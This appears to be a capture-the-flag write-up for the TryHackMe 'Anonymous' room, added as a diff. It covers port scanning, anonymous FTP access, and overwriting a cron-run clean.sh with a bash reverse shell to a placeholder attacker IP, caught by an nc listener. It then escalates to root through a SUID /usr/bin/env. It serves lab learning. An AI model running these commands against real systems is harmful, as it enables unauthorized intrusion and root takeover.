@@ -1,0 +1,89 @@
+# TryHackMe — Anonymous
+
+**Target IP:** 10.114.166.173
+
+---
+
+## Reconnaissance
+
+### Port Scan
+
+```
+nmap -sV -sC 10.114.166.173
+```
+
+Results:
+
+```
+21/tcp  open  ftp         vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx  2 111  113  4096 Jun 04 2020 scripts [NSE: writeable]
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu
+```
+
+---
+
+## Enumeration
+
+### FTP
+
+Anonymous login is permitted. The `/scripts` directory contains:
+
+```
+-rwxr-xrwx  clean.sh          (world-writable)
+-rw-rw-r--  removed_files.log
+-r--r--r--  to_do.txt
+```
+
+`clean.sh` is executed periodically by a cron job and is world-writable — a clear vector for a reverse shell.
+
+---
+
+## Initial Access
+
+A reverse shell payload was written locally and uploaded via FTP, overwriting `clean.sh`:
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+```
+
+```
+ftp> cd scripts
+ftp> put /path/to/clean.sh clean.sh
+```
+
+Listener on attacker machine:
+
+```
+nc -lvnp 4444
+```
+
+When the cron job executed `clean.sh`, a shell was received as **namelessone**.
+
+**User flag:** `[REDACTED]`
+
+---
+
+## Privilege Escalation
+
+SUID binaries were enumerated:
+
+```bash
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+`/usr/bin/env` has the SUID bit set. This allows spawning a privileged shell:
+
+```bash
+/usr/bin/env /bin/sh -p
+```
+
+```
+$ whoami
+root
+```
+
+**Root flag:** `[REDACTED]`
